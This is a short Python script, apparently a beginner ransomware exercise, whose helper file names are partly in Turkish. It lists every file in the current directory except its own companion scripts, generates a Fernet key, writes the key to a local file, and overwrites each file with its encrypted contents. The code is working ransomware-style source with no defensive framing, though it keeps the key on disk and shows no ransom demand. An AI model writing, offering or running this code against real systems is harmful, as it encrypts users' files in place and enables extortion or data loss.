from distutils import filelist
from genericpath import isfile
import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransom.py" or file == "dosyalari-sifrele.py" or file == "generatedkey.key" or file == "dosyalari-coz.py":
        continue

    if os.path.isfile(file):
        file_list.append(file)

print(file_list)

key = Fernet.generate_key()

print(key)

with open("generatedkey.key","wb") as generetedkey:
    generetedkey.write(key)

for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file ,"wb") as the_file:
        the_file.write(contents_encrypted)
